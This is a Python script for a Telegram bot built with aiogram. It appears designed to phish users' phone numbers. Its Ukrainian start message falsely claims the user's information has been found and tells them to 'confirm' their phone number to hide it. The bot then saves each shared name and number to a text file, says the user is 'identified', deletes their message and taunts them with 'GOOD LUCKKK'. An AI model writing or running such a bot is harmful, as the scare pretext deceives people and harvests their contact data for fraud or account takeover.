import logging
import random
from aiogram import Bot, types, Dispatcher
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor

API_TOKEN = "token"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def on_start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    button = types.KeyboardButton(text="✅ Пітдвердити номер телефону", request_contact=True)
    keyboard.add(button)
    
    await message.answer("<b>🗂 Номер телефона\n\n"
                         "Вашу інформацію було знайдемо щоб приховати її пітдвердіть номер телефону.\n\n"
                         "Нажміть кнопку нижче.</b>", reply_markup=keyboard, parse_mode="HTML")

@dp.message_handler(content_types=[types.ContentType.CONTACT])
async def on_contact_received(message: types.Message):
    contact = message.contact
    random_filename = f"contact_{random.randint(1000, 9999)}.txt"
    
    with open(random_filename, 'w') as file:
        file.write(f"Contact Name: {contact.first_name}\n"
                   f"Contact Phone Number: {contact.phone_number}")
    
    await message.answer("Вы успешно идентифицированы.", reply_markup=types.ReplyKeyboardRemove())
    
    await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    
    await bot.send_message(chat_id=message.chat.id, text="GOOD LUCKKK)).", parse_mode="Markdown")

if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)
